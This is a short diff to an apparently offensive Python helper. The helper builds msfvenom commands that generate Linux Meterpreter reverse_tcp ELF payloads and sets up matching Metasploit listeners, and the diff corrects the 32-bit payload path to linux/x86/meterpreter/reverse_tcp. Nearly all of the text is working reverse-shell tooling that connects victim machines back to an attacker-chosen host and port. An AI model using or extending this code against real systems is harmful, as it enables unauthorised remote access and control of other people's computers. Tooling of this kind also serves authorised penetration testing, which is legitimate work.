@@ -199,7 +199,7 @@ def msfvenom(type, lhost, lport):
     elif type == 'lin64' or type == 'mperl64':
         command = "msfvenom --platform linux -a x64 -p linux/x64/meterpreter/reverse_tcp LHOST=%s LPORT=%s -f elf > ./%s_payload" % (lhost, lport, type)
     elif type == 'lin32' or type == 'mperl32':
-        command = "msfvenom --platform linux -a x86 -p linux/meterpreter/reverse_tcp LHOST=%s LPORT=%s -f elf > ./%s_payload" % (lhost, lport, type)
+        command = "msfvenom --platform linux -a x86 -p linux/x86/meterpreter/reverse_tcp LHOST=%s LPORT=%s -f elf > ./%s_payload" % (lhost, lport, type)
     else:
         print_usage()
 
@@ -221,7 +221,7 @@ def listener(type, lhost, lport):
     elif type == 'lin64s':
         payload += "set PAYLOAD linux/x64/meterpreter/reverse_tcp\n"
     elif type == 'lin32s':
-        payload += "set PAYLOAD linux/meterpreter/reverse_tcp\n"
+        payload += "set PAYLOAD linux/x86/meterpreter/reverse_tcp\n"
     else:
         print_usage()
 
